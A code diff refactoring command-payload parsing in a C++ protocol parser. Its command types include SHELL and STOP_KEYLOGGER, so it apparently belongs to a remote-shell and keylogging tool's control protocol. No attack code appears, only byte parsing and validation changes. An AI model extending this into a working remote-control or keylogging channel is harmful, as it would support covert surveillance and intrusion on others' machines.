@@ -3,22 +3,11 @@
 namespace {
 
 CommandType toCommandType(uint8_t value) {
-  if (value <= static_cast<uint8_t>(CommandType::STOP_KEYLOGGER)) {
-    return static_cast<CommandType>(value);
+  if (value >= static_cast<uint8_t>(CommandType::END)) {
+    throw InvalidFieldValue("command_type",
+                            std::to_string(static_cast<unsigned int>(value)));
   }
-  throw InvalidFieldValue("command_type",
-                          std::to_string(static_cast<unsigned int>(value)));
-}
-
-void validateCommandSize(CommandType type, uint16_t dataLen,
-                         const std::vector<uint8_t>& input) {
-  const std::size_t expectedSize = COMMAND_FIXED_BYTES + dataLen;
-  if (input.size() != expectedSize) {
-    throw InvalidSize("command payload", std::to_string(input.size()));
-  }
-  if (type != CommandType::SHELL && dataLen != 0) {
-    throw InvalidSize("command data length", std::to_string(dataLen));
-  }
+  return static_cast<CommandType>(value);
 }
 
 }  // namespace
@@ -28,15 +17,22 @@ CommandPayload ProtocolParser::parseCommandPayload(
   if (input.size() < COMMAND_FIXED_BYTES) {
     throw InvalidSize("command payload", std::to_string(input.size()));
   }
+
   const CommandType type = toCommandType(input[2]);
   const uint16_t dataLen = ConvertEndian::readU16BE(input, 3);
-  validateCommandSize(type, dataLen, input);
+  
+  size_t expectedSize = COMMAND_FIXED_BYTES + dataLen;
+  validateExpectedLength(input, expectedSize);
 
   CommandPayload payload;
   payload.id = ConvertEndian::readU16BE(input, 0);
   payload.type = type;
-  payload.data.assign(
-      reinterpret_cast<const char*>(input.data() + COMMAND_FIXED_BYTES),
-      dataLen);
+
+  if (payload.type == CommandType::SHELL && dataLen != 0) {
+    payload.data.assign(
+        reinterpret_cast<const char*>(input.data() + COMMAND_FIXED_BYTES),
+        dataLen);
+  }
+
   return payload;
 }
